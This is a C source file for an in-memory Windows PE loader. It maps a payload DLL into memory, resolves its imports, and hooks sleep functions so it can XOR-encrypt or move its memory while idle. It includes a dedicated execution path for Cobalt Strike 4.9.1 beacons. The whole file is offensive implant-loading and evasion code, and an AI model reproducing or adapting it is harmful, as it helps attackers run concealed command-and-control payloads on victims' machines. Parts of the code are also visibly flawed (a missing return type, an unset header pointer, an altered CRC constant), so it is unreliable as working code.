#include <stdio.h>
#include "memloader.h"
#include "hooks.h"
#include "utils.h"

PMEM_MODULE pMemModule = NULL;
LPVOID oldbase = NULL;


//--------------------------------------------------------------------------------------------------------------//
// the following 2 functions, are made to add elements in the arrays we have
void AppendTSizeArray(SIZE_T Value) {
    for (int i = 0; i < SIZE_ARRAY + 1; i++){
        if (TSizeArray[i] == 0){
            TSizeArray[i] = Value;
            index++;
            break;
        }
    }
}

void AppendlpBaseArray(PVOID Value) {
    for (int i = 0; i < SIZE_ARRAY + 1; i++) {
        if (lpBaseArray[i] == NULL) {
            lpBaseArray[i] = Value;
            break;
        }
    }
}

//--------------------------------------------------------------------------------------------------------------//
BOOL LoadModuleInt(PMEM_MODULE pMemModule, LPVOID PEdata, BOOL CallEntryPoint) {
    if ( pMemModule  == NULL || PEdata == NULL)
        return FALSE;
    pMemModule->dwErrorCode = ERROR_SUCCESS;
    // Verify file format
    if (IsPEValid(pMemModule, PEdata) == FALSE) {
        return FALSE;
    }
    // Map PE header and section table into memory
    if (MapModule(pMemModule, PEdata) == FALSE)
        return FALSE;
    // Relocate the module base
    if (doRelocations(pMemModule) == FALSE) {
        UnmapModule(pMemModule);
        return FALSE;
    }
    // Resolve the import table
    if (ResolveImports(pMemModule) == FALSE) {
        UnmapModule(pMemModule);
        return FALSE;
    }
    pMemModule->dwCrc = GetCRC32(0, pMemModule->lpBase, pMemModule->dwSizeOfImage);

    // Correct the protect flag for all section pages  ---  DO THIS IF YOU WANT 2 ALLOCATIONS
    //if (FALSE == SetRXonSection(DllPayload.startOfMappedPE)) {
		//UnmapModule(pMemModule);
		//return FALSE;
	//}
    // don't do this if you want 2 allocations or RWX
	if (Configs.SleepHookFunc == SleepHookRWRX) {
		if (SetPermissions(pMemModule) == FALSE) {
			UnmapModule(pMemModule);
			return FALSE;
		}
	}
    
    // process tls data
    if (HandleTLS(pMemModule) == FALSE)
        return FALSE;
    if (CallEntryPoint) {
        if (CallModuleEntry(pMemModule, DLL_PROCESS_ATTACH) == FALSE) {
            // failed to call entry point,
            // clean resource, return false
            UnmapModule(pMemModule);
            return FALSE;
        }
    }

    return TRUE;
}

HMEMMODULE LoadMod(LPVOID PEdata, BOOL CallEntryPoint, DWORD* pdwError) {
    pMemModule = GlobalAlloc(GPTR, sizeof(MEM_MODULE));
    if (pMemModule == NULL) {
        if (pdwError != NULL) {
            *pdwError = MMEC_INVALID_WIN32_ENV;
        }
        return NULL;
    }

    pMemModule->CallEntryPoint = CallEntryPoint;
    pMemModule->isLoaded = FALSE;
    pMemModule->dwErrorCode = MMEC_OK;

    if (!LoadModuleInt(pMemModule, PEdata, CallEntryPoint)) {
        if (pdwError != NULL) {
            *pdwError = pMemModule->dwErrorCode;
        }
        GlobalFree(pMemModule);
        return NULL;
    }

    if (pdwError != NULL) {
        *pdwError = 0;
    }
    return (HMEMMODULE)pMemModule;
}


//--------------------------------------------------------------------------------------------------------------//
// Tests the return value and jump to exit label if false.
#define IfFalseGoExitWithError(x, exp)                                                                                 \
  do {                                                                                                                 \
    if (!(br = (x)) && (exp))                                                                                          \
      goto _Exit;                                                                                                      \
  } while (0)


//--------------------------------------------------------------------------------------------------------------//
// Create a pointer value.
#define MakePointer(t, p, offset) ((t)((PBYTE)(p) + offset))

//--------------------------------------------------------------------------------------------------------------//
/// <returns>True if the data is valid PE format.</returns>
BOOL IsPEValid(PMEM_MODULE pMemModule, LPVOID PEdata) {
    if (pMemModule == NULL) {
        return FALSE;
    }

    BOOL isValid = FALSE;
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)PEdata;

    if (IMAGE_DOS_SIGNATURE != pImageDosHeader->e_magic) {
        goto Exit;
    }

    PIMAGE_NT_HEADERS pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, PEdata, pImageDosHeader->e_lfanew);
    if (IMAGE_NT_SIGNATURE != pImageNtHeader->Signature) {
        goto Exit;
    }

#ifdef _WIN64
    if (IMAGE_FILE_MACHINE_AMD64 == pImageNtHeader->FileHeader.Machine) {
        if (IMAGE_NT_OPTIONAL_HDR64_MAGIC != pImageNtHeader->OptionalHeader.Magic) {
            goto Exit;
        }
    }
#else
    if (IMAGE_FILE_MACHINE_I386 == pImageNtHeader->FileHeader.Machine) {
        if (IMAGE_NT_OPTIONAL_HDR32_MAGIC != pImageNtHeader->OptionalHeader.Magic) {
            goto Exit;
        }
    }
#endif
    else {
        goto Exit;
    }

    isValid = TRUE;

Exit:
    if (!isValid) {
        pMemModule->dwErrorCode = MMEC_BAD_PE_FORMAT;
    }
    return isValid;
}


//--------------------------------------------------------------------------------------------------------------//
// this function here is used to map all the sections
BOOL MapModule(PMEM_MODULE pMemModule, LPVOID PEdata) {
    if (pMemModule == NULL || PEdata == NULL)
        return FALSE;

    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)(PEdata);
    PIMAGE_NT_HEADERS pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, pImageDosHeader, pImageDosHeader->e_lfanew);
    int nNumberOfSections = pImageNtHeader->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pImageSectionHeader = MakePointer(PIMAGE_SECTION_HEADER, pImageNtHeader, sizeof(IMAGE_NT_HEADERS));

    DWORD dwImageSizeLimit = 0;
    for (int i = 0; i < nNumberOfSections; ++i) {
        if (pImageSectionHeader[i].VirtualAddress != 0) {
            DWORD sectionLimit = pImageSectionHeader[i].VirtualAddress + pImageSectionHeader[i].SizeOfRawData;
            if (dwImageSizeLimit < sectionLimit)
                dwImageSizeLimit = sectionLimit;
        }
    }
    DllPayload.mappedimagesize = dwImageSizeLimit;

    // Reserve virtual memory
    
    DWORD protection = (Configs.SleepHookFunc == SleepHookMemoryBouncing || Configs.SleepHookFunc == SleepHookMemoryHopping) ? PAGE_EXECUTE_READWRITE : PAGE_READWRITE;
    LPVOID lpBase = VirtualAlloc((LPVOID)(pImageNtHeader->OptionalHeader.ImageBase), pImageNtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, protection);
    if (NULL == lpBase) {
        lpBase = VirtualAlloc(NULL, pImageNtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, protection);
        if (NULL == lpBase) {
            pMemModule->dwErrorCode = MMEC_ALLOCATED_MEMORY_FAILED;
            return FALSE;
        }
    }

    DllPayload.startOfMappedPE = lpBase;
    oldbase = DllPayload.startOfMappedPE;
    AppendlpBaseArray(lpBase);
    AppendTSizeArray(dwImageSizeLimit);
    // Commit memory for PE header
    LPVOID pDest = lpBase;//VirtualAlloc(lpBase, pImageNtHeader->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);
    if (!pDest) {
        pMemModule->dwErrorCode = MMEC_ALLOCATED_MEMORY_FAILED;
        return FALSE;
    }


    AppendlpBaseArray(pDest);
    AppendTSizeArray(pImageNtHeader->OptionalHeader.SizeOfHeaders);
    RtlMoveMemory(pDest, PEdata, pImageNtHeader->OptionalHeader.SizeOfHeaders);

    pMemModule->lpBase = pDest;
    pMemModule->iBase = (ULONGLONG)pDest; 
    pMemModule->dwSizeOfImage = pImageNtHeader->OptionalHeader.SizeOfImage;
    pMemModule->isLoaded = TRUE;

    pImageDosHeader = (PIMAGE_DOS_HEADER)pDest;
    pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, pImageDosHeader, pImageDosHeader->e_lfanew);
    pImageSectionHeader = MakePointer(PIMAGE_SECTION_HEADER, pImageNtHeader, sizeof(IMAGE_NT_HEADERS));

    LPVOID pSectionBase = NULL;
    LPVOID pSectionDataSource = NULL;
    for (int i = 0; i < nNumberOfSections; ++i) {
        if (pImageSectionHeader[i].VirtualAddress != 0) {
            pSectionBase = MakePointer(LPVOID, lpBase, pImageSectionHeader[i].VirtualAddress);
            if (pImageSectionHeader[i].SizeOfRawData == 0) {
                DWORD size = pImageSectionHeader[i].Misc.VirtualSize > 0 ? pImageSectionHeader[i].Misc.VirtualSize : pImageNtHeader->OptionalHeader.SectionAlignment;
                if (size > 0) {
                    ZeroMemory(pSectionBase, size);
                }
            }
            else {
				// Checking if section has executable flag
                if (pImageSectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                    DllPayload.execRegionPtr = pSectionBase;
                    DllPayload.execRegionSize = pImageSectionHeader[i].SizeOfRawData;
                    printf("[+] Saved RX memory pointer address: %#llx and size %#llx\n", (unsigned long long)DllPayload.execRegionPtr, (unsigned long long)DllPayload.execRegionSize);
                }
                pSectionDataSource = MakePointer(LPVOID, PEdata, pImageSectionHeader[i].PointerToRawData);
                RtlMoveMemory(pSectionBase, pSectionDataSource, pImageSectionHeader[i].SizeOfRawData);
            }
        }
    }
    
    

    if (Configs.SleepHookFunc == SleepHookMemoryHopping || Configs.SleepHookFunc == SleepHookMemoryBouncing) {
        printf("[+] copying %u (%#llx) bytes from address %p to buffer\n", DllPayload.mappedimagesize, (unsigned long long)DllPayload.mappedimagesize, DllPayload.startOfMappedPE);
        DllPayload.tempPEdatabuffer = (BYTE*)malloc(DllPayload.mappedimagesize);
        if (DllPayload.tempPEdatabuffer == NULL) {
            printf("[+] Error: Failed to allocate dataBuffer\n");
            return FALSE;
        }
        memcpy(DllPayload.tempPEdatabuffer, (LPVOID)(pImageNtHeader->OptionalHeader.ImageBase), DllPayload.mappedimagesize);
        printf("[+] XORing buffer\n");
        XORWithKey(DllPayload.tempPEdatabuffer, DllPayload.mappedimagesize, Configs.SleepXorKey);
    }
    

    return TRUE;
}


//--------------------------------------------------------------------------------------------------------------//
// Relocates the module.
doRelocations(PMEM_MODULE pMemModule) {
    if (pMemModule == NULL || pMemModule->pImageDosHeader == NULL)
        return FALSE;

    PIMAGE_NT_HEADERS pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, pMemModule->pImageDosHeader, pMemModule->pImageDosHeader->e_lfanew);
    LONGLONG lBaseDelta = (PBYTE)pMemModule->lpBase - (PBYTE)oldbase;

    if (lBaseDelta == 0) {
        printf("[+] no delta detected from address: %#llx\n", (unsigned long long)DllPayload.startOfMappedPE);
        return TRUE;
    }

    printf("[+] delta of %lld (%#llx) bytes detected from address: %#llx\n", (unsigned long long)lBaseDelta, (unsigned long long)lBaseDelta, (unsigned long long)DllPayload.startOfMappedPE);

    if (pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0 ||
        pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
        return TRUE;

    PIMAGE_BASE_RELOCATION pImageBaseRelocation = MakePointer(PIMAGE_BASE_RELOCATION, pMemModule->lpBase,
        pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    if (pImageBaseRelocation == NULL) {
        pMemModule->dwErrorCode = MMEC_INVALID_RELOCATION_BASE;
        return FALSE;
    }

    while ((pImageBaseRelocation->VirtualAddress + pImageBaseRelocation->SizeOfBlock) != 0) {
        PWORD pRelocationData = MakePointer(PWORD, pImageBaseRelocation, sizeof(IMAGE_BASE_RELOCATION));
        int NumberOfRelocationData = (pImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (int i = 0; i < NumberOfRelocationData; i++) {
            if (IMAGE_REL_BASED_HIGHLOW == (pRelocationData[i] >> 12)) {
                PDWORD pAddress = (PDWORD)(pMemModule->iBase + pImageBaseRelocation->VirtualAddress + (pRelocationData[i] & 0x0FFF));
                DWORD oldAddress = *pAddress;
                *pAddress += (DWORD)lBaseDelta;
                printf("[+] Relocated HIGHLOW at %#llx from %#llx to %#llx\n", (ULONGLONG)pAddress, (ULONGLONG)oldAddress, (ULONGLONG)*pAddress);
            }

#ifdef _WIN64
            if (IMAGE_REL_BASED_DIR64 == (pRelocationData[i] >> 12)) {
                PULONGLONG pAddress = (PULONGLONG)(pMemModule->iBase + pImageBaseRelocation->VirtualAddress + (pRelocationData[i] & 0x0FFF));
                ULONGLONG oldAddress = *pAddress;
                *pAddress += lBaseDelta;
                printf("[+] Relocated DIR64 at %#llx from %#llx to %#llx\n", (ULONGLONG)pAddress, (ULONGLONG)oldAddress, (ULONGLONG)*pAddress);
            }
#endif
        }

        pImageBaseRelocation = MakePointer(PIMAGE_BASE_RELOCATION, pImageBaseRelocation, pImageBaseRelocation->SizeOfBlock);
    }

    return TRUE;
}







BOOL ResolveImports(PMEM_MODULE pMemModule) {
    if (NULL == pMemModule || NULL == pMemModule->pImageDosHeader)
        return FALSE;

    PIMAGE_NT_HEADERS pImageNtHeader =
        MakePointer(PIMAGE_NT_HEADERS, pMemModule->pImageDosHeader, pMemModule->pImageDosHeader->e_lfanew);

    if (pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress == 0 ||
        pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0)
        return TRUE;

    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor =
        MakePointer(PIMAGE_IMPORT_DESCRIPTOR, pMemModule->lpBase,
            pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; pImageImportDescriptor->Name; pImageImportDescriptor++) {
        PCHAR pDllName = MakePointer(PCHAR, pMemModule->lpBase, pImageImportDescriptor->Name);
        HMODULE hMod = GetModuleHandleA(pDllName);
        if (NULL == hMod) {
            hMod = LoadLibraryA(pDllName);
        }
        if (NULL == hMod) {
            pMemModule->dwErrorCode = MMEC_IMPORT_MODULE_FAILED;
            return FALSE;
        }

        uintptr_t* thunkRef;
        FARPROC* funcRef;

        if (pImageImportDescriptor->OriginalFirstThunk) {
            thunkRef = MakePointer(uintptr_t*, pMemModule->lpBase, pImageImportDescriptor->OriginalFirstThunk);
            funcRef = MakePointer(FARPROC*, pMemModule->lpBase, pImageImportDescriptor->FirstThunk);
        }
        else {
            thunkRef = MakePointer(uintptr_t*, pMemModule->lpBase, pImageImportDescriptor->FirstThunk);
            funcRef = MakePointer(FARPROC*, pMemModule->lpBase, pImageImportDescriptor->FirstThunk);
        }

        for (; *thunkRef; thunkRef++, funcRef++) {
            if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
                *funcRef = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
                printf("[+] Ordinal: %llu, Address: %p\n", (unsigned long long)IMAGE_ORDINAL(*thunkRef), *funcRef);
            }
            else {
                PIMAGE_IMPORT_BY_NAME thunkData = MakePointer(PIMAGE_IMPORT_BY_NAME, pMemModule->lpBase, (*thunkRef));
                *funcRef = GetProcAddress(hMod, (LPCSTR)&thunkData->Name);
                printf("[+] Function Name: %s, Address: %p\n", thunkData->Name, *funcRef);

                // Check if the function should be hooked
				if (Configs.SleepHookFunc != NULL) {
                    if (check_hook((LPCSTR)&thunkData->Name)) {
                        printf("[+] Hooking function: %s\n", thunkData->Name);
                        *funcRef = (FARPROC)Configs.SleepHookFunc;
                    }
                }
            }

            if (*funcRef == 0) {
                pMemModule->dwErrorCode = MMEC_IMPORT_MODULE_FAILED;
                return FALSE;
            }
            printf("[+] Written to IAT at address: %p\n", (void*)funcRef);
        }
    }

    return TRUE;
}



BOOL SetPermissions(PMEM_MODULE pMemModule) {
    if (pMemModule == NULL)
        return FALSE;

    int Protections[2][2][2] = {
        {{PAGE_NOACCESS, PAGE_WRITECOPY}, {PAGE_READONLY, PAGE_READWRITE}},
        {{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY}, {PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}},
    };

    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)(pMemModule->lpBase);

    ULONGLONG ulBaseHigh = 0;
#ifdef _WIN64
    ulBaseHigh = (pMemModule->iBase & 0xffffffff00000000);
#endif

    PIMAGE_NT_HEADERS pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, pImageDosHeader, pImageDosHeader->e_lfanew);
    int nNumberOfSections = pImageNtHeader->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pImageSectionHeader = MakePointer(PIMAGE_SECTION_HEADER, pImageNtHeader, sizeof(IMAGE_NT_HEADERS));

    for (int idxSection = 0; idxSection < nNumberOfSections; idxSection++) {
        DWORD protectFlag = 0;
        DWORD oldProtect = 0;
        BOOL isExecutable = FALSE;
        BOOL isReadable = FALSE;
        BOOL isWritable = FALSE;
        BOOL isNotCache = FALSE;

        ULONGLONG dwSectionBase = (ULONGLONG)pMemModule->lpBase + pImageSectionHeader[idxSection].VirtualAddress;

        DWORD dwSecionSize = pImageSectionHeader[idxSection].SizeOfRawData;
        if (dwSecionSize == 0)
            continue;

        DWORD dwSectionCharacteristics = pImageSectionHeader[idxSection].Characteristics;

        if (dwSectionCharacteristics & IMAGE_SCN_MEM_DISCARDABLE) {
            VirtualFree((LPVOID)dwSectionBase, dwSecionSize, MEM_DECOMMIT);
            continue;
        }

        if (dwSectionCharacteristics & IMAGE_SCN_MEM_EXECUTE)
            isExecutable = TRUE;

        if (dwSectionCharacteristics & IMAGE_SCN_MEM_READ)
            isReadable = TRUE;

        if (dwSectionCharacteristics & IMAGE_SCN_MEM_WRITE)
            isWritable = TRUE;

        if (dwSectionCharacteristics & IMAGE_SCN_MEM_NOT_CACHED)
            isNotCache = TRUE;

        protectFlag = Protections[isExecutable][isReadable][isWritable];
        if (isNotCache)
            protectFlag |= PAGE_NOCACHE;

        if (!VirtualProtect((LPVOID)dwSectionBase, dwSecionSize, protectFlag, &oldProtect)) {
            printf("[+] VirtualProtect failed for address: %p, size: %lu (%#llx), permissions: %lu\n", (void*)dwSectionBase, dwSecionSize, (unsigned long long)dwSecionSize, protectFlag);
            pMemModule->dwErrorCode = MMEC_PROTECT_SECTION_FAILED;
            return FALSE;
        } else {
            printf("[+] VirtualProtect succeeded for address: %p, size: %lu (%#llx), permissions: %lu\n", (void*)dwSectionBase, dwSecionSize, (unsigned long long)dwSecionSize, protectFlag);
        }
    }

    return TRUE;
}


//--------------------------------------------------------------------------------------------------------------//
// Processes TLS data
BOOL HandleTLS(PMEM_MODULE pMemModule) {
    if (pMemModule == NULL || pMemModule->pImageDosHeader == NULL)
        return FALSE;

    PIMAGE_NT_HEADERS pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, pMemModule->pImageDosHeader, pMemModule->pImageDosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY imageDirectoryEntryTls = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

    if (imageDirectoryEntryTls.VirtualAddress == 0)
        return TRUE;

    PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(pMemModule->iBase + imageDirectoryEntryTls.VirtualAddress);
    PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;

    if (callback) {
        while (*callback) {
            (*callback)((LPVOID)pMemModule->hModule, DLL_PROCESS_ATTACH, NULL);
            callback++;
        }
    }

    return TRUE;
}


//--------------------------------------------------------------------------------------------------------------//
// Calls the module entry.
BOOL CallModuleEntry(PMEM_MODULE pMemModule, DWORD dwReason) {
    if (pMemModule == NULL || pMemModule->pImageDosHeader == NULL)
        return FALSE;

    PIMAGE_NT_HEADERS pImageNtHeader = MakePointer(PIMAGE_NT_HEADERS, pMemModule->pImageDosHeader, pMemModule->pImageDosHeader->e_lfanew);
    Type_DllMain pfnModuleEntry = NULL;

    if (pImageNtHeader->OptionalHeader.AddressOfEntryPoint == 0) {
        return FALSE;
    }

    pfnModuleEntry = MakePointer(Type_DllMain, pMemModule->lpBase, pImageNtHeader->OptionalHeader.AddressOfEntryPoint);

    if (pfnModuleEntry == NULL) {
        pMemModule->dwErrorCode = MMEC_INVALID_ENTRY_POINT;
        return FALSE;
    }

    printf("[+] Calling entry point at address: %p\n", (void*)pfnModuleEntry);

    
    
    if (Configs.downloadedBuffer != NULL) {
        printf("[+] freeing original opened/downloaded payload at address %p\n", Configs.downloadedBuffer);
        free(Configs.downloadedBuffer);
        Configs.downloadedBuffer = NULL; // Set pointer to NULL after freeing
    }
    
    
    
    // execution method for Cobalt Strike 4.9.1 
    if(Configs.Beacon){
    pfnModuleEntry(pMemModule->hModule, dwReason, NULL);
    return pfnModuleEntry(pMemModule->hModule, 4, NULL);
	}
	else {
		return pfnModuleEntry(pMemModule->hModule, dwReason, NULL);

	}
}



//--------------------------------------------------------------------------------------------------------------//
// Unmaps all the sections.
VOID UnmapModule(PMEM_MODULE pMemModule) {
    if (NULL == pMemModule ||  FALSE == pMemModule->isLoaded || NULL == pMemModule->lpBase)
        return;
    VirtualFree(pMemModule->lpBase, 0, MEM_RELEASE);
    pMemModule->lpBase = NULL;
    pMemModule->dwCrc = 0;
    pMemModule->dwSizeOfImage = 0;
    pMemModule->isLoaded = FALSE;
}

//--------------------------------------------------------------------------------------------------------------//
// Gets the CRC32 of the data.
UINT32 GetCRC32(UINT32 uInit, void* pBuf, UINT32 nBufSize) {
#define CRC32_POLY 0x04C10DB7L
    UINT32 crc = 0;
    UINT32 Crc32table[256];
    for (int i = 0; i < 256; i++) {
        crc = (UINT32)(i << 24);
        for (int j = 0; j < 8; j++) {
            if (crc >> 31)
                crc = (crc << 1) ^ CRC32_POLY;
            else
                crc = crc << 1;
        }
        Crc32table[i] = crc;
    }

    crc = uInit;
    UINT32 nCount = nBufSize;
    PUCHAR p = (PUCHAR)pBuf;
    while (nCount--) {
        crc = (crc << 8) ^ Crc32table[(crc >> 24) ^ *p++];
    }

    return crc;
}
